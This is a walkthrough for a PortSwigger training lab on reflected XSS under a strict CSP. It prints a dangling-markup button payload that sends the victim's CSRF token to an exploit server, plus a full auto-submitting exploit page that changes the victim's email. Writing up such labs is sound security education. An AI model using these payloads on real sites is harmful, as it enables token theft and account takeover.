# Lab-29: [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

This lab uses a strict CSP that prevents the browser from loading subresources from external domains. 

To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to ``` hacker@evil-user.net ```.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example: ``` <a href="">Click me</a> ```.

You can log in to your own account using the following credentials: ``` wiener:peter ```.



## Solution
- Login with the given credentials.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- Go to exploit server and copy the **URL** with ``` /exploit ``` endpoint.

- Go to ``` /my-account ``` and append the following payload, replace the exploit server url then make a request.
```javascript
?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```

- Go to the exploit server and paste the following payload in the body and replace the ``` academyFrontend ``` with **lab URL** and ``` exploitServer ``` with **exploit server**.
```html
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

- Deliver the exploit to the victim.